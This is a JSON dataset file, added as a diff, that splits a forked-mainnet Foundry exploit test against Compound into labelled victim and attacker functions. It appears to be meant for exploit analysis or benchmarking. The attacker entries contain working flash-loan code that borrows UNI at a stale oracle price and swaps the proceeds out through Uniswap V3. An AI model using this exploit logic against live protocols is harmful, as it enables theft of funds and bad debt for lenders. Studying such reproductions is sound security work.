@@ -1,0 +1,254 @@
+[
+  {
+    "contract/interface": "IcUniToken",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        return borrowInternal(borrowAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundcUSDC",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(uint mintAmount) external returns (uint) {\n        return mintInternal(mintAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapAnchoredView",
+    "source_type": "victim_contract",
+    "function_name": "getUnderlyingPrice",
+    "original_code": "    function getUnderlyingPrice(address cToken)\n        external\n        view\n        returns (uint256)\n    {\n        TokenConfig memory config = getTokenConfigByCToken(cToken);\n        // Comptroller needs prices in the format: ${raw price} * 1e36 / baseUnit\n        // The baseUnit of an asset is the amount of the smallest denomination of that asset per whole.\n        // For example, the baseUnit of ETH is 1e18.\n        // Since the prices in this view have 6 decimals, we must scale them by 1e(36 - 6)/baseUnit\n        return FullMath.mulDiv(1e30, priceInternal(config), config.baseUnit);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "AMOUNT",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "UNI_WETH_Pool",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "USDC",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "UniswapAnchoredView",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "WETH",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "WETH_USDC_Pool",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "cUSDC",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "cUniToken",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "comptroller",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "num",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public {\n        // pledge the USDC\n        USDC.approve(address(cUSDC), AMOUNT);\n        cUSDC.mint(AMOUNT);\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(cUSDC);\n        comptroller.enterMarkets(cTokens);\n\n        // You should calculate the max u can borrow\n        (, uint256 myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));\n\n        // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound\n        uint256 max_UNI_borrow =\n            myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 10 ** uni.decimals();\n        cUniToken.borrow(max_UNI_borrow);\n\n        // Swap: UNI => WETH => USDC, for the low Slippage\n        UNI_WETH_Pool.swap(address(this), true, int256(uni.balanceOf(address(this))), 42_095_128_740, bytes(\"\"));\n        WETH_USDC_Pool.swap(\n            address(this),\n            false,\n            int256(WETH.balanceOf(address(this))),\n            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,\n            bytes(\"\")\n        );\n\n        USDC.transfer(msg.sender, AMOUNT); // pay back flashloan\n    }\n\n    uint256 public num = 0;\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_290_921 - 1);\n        vm.label(address(vault), \"Balancer vault\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(cUSDC), \"cUSDC\");\n        vm.label(address(comptroller), \"comptroller\");\n        vm.label(address(cUniToken), \"cUniToken\");\n        vm.label(address(UNI_WETH_Pool), \"UNI_WETH_Pool\");\n        vm.label(address(uni), \"uni\");\n        vm.label(address(WETH_USDC_Pool), \"WETH_USDC_Pool\");\n        vm.label(address(WETH), \"WETH\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        console.log(\"USDC balance:\");\n        emit log_named_decimal_uint(\"   [INFO] Before attack\", USDC.balanceOf(address(this)), 6);\n\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(USDC);\n        amounts[0] = AMOUNT;\n        vault.flashLoan(address(this), tokens, amounts, bytes(\"\"));\n\n        emit log_named_decimal_uint(\"   [INFO] After attack\", USDC.balanceOf(address(this)), 6);\n        console.log(\"When compound update the price, incomplete liquidation leading to bad debts\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uni",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) public {\n        // For the twice swap()\n        if (num == 0) {\n            uni.transfer(msg.sender, uint256(amount0Delta));\n            num++;\n        } else {\n            WETH.transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "vault",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "enterMarkets",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "getAccountLiquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUNI",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address owner) external view returns (uint256) {\n        return accountTokens[owner];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUNI",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUNI",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {\n        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUNIV3Pool",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n}\n\n/// @title Callback for IUniswapV3PoolActions#swap\n/// @notice Any contract that calls IUniswapV3PoolActions#swap must implement this interface\ninterface IUniswapV3SwapCallback {\n    /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.\n    /// @dev In the implementation you must pay the pool tokens owed for the swap.\n    /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.\n    /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.\n    /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by\n    /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.\n    /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by\n    /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.\n    /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call\n    function uniswapV3SwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata data\n    ) external;\n}\n\ninterface IERC20 {\n",
+    "description": ""
+  }
+]
